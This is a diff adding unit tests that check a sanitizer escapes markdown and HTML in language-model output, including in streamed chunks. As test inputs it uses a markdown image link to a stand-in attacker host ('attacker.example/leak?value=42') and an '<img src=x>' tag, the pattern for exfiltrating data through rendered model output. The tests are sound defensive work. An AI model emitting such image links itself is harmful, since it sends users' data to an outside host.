@@ -46,6 +46,27 @@ class FileSafetyTests(unittest.TestCase):
         self.assertEqual(len(name), app.MAX_COLUMN_NAME_LENGTH)
         self.assertTrue(name.endswith("…"))
 
+    def test_neutralizes_active_markdown_in_model_output(self) -> None:
+        output = "![stats](https://attacker.example/leak?value=42) <img src=x>"
+
+        safe_output = app.model_output_to_safe_markdown(output)
+
+        self.assertNotIn("![", safe_output)
+        self.assertNotIn("](", safe_output)
+        self.assertIn(r"\!\[stats\]", safe_output)
+        self.assertIn(r"https\:\/\/attacker\.example", safe_output)
+        self.assertIn(r"\<img src\=x\>", safe_output)
+
+    def test_stream_sanitization_is_safe_across_chunk_boundaries(self) -> None:
+        chunks = ["!", "[stats](", "https://attacker.example/leak)"]
+        captured: list[str] = []
+
+        displayed = "".join(app.safe_model_output_stream(iter(chunks), captured))
+
+        raw_output = "".join(chunks)
+        self.assertEqual("".join(captured), raw_output)
+        self.assertEqual(displayed, app.model_output_to_safe_markdown(raw_output))
+
 
 if __name__ == "__main__":
     unittest.main()
